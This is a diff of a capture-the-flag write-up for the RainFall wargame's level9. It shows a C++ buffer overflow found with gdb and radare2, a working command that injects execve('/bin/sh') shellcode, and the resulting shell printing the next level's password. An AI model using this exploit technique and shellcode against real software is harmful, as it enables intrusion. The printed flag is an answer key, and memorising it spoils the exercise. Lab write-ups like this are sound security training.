@@ -13,7 +13,7 @@ Finally: We can totaly overflow the buffer in N::setAnnotation !
 
 We are again using https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
-(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7
 0x08048682 in main ()
 (gdb) i r
 eax            0x41366441
@@ -21,7 +21,7 @@ eax            0x41366441
 
 -> offset is 108
 
-Let's try to find where our buffer is stored.
+Let's try to find where our buffer is stored:
 'n0' and 'n1' are the variable names I used in 'source.cpp'.
 
 (gdb) disas main
@@ -32,8 +32,8 @@ Let's try to find where our buffer is stored.
 (...)
 0x08048693 <+159>:   call   *%edx
 
+Using r2, we see (aaa;s main;pdc):
 
-Using r2 we see (aaa;s main;pdc):
 [0x080485f4]> pdc
    eax = dword [var_14h]         <= eax is set to '*n0'
    dword [esp] = eax
@@ -62,7 +62,10 @@ We use this shellcode: http://shell-storm.org/shellcode/files/shellcode-575.php
  4 bytes  -  21 bytes   -  83 bytes -  4 bytes = 112 bytes
 The last address points to the first adress, which points to the shellcode
 
-./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '_'*83 + '\x0c\xa0\x04\x08'")
-
+level9@RainFall:~$ ./level9 $(python -c "print \
+   '\x10\xa0\x04\x08' \
+   + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' \
+   + '_'*83 \
+   + '\x0c\xa0\x04\x08'")
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
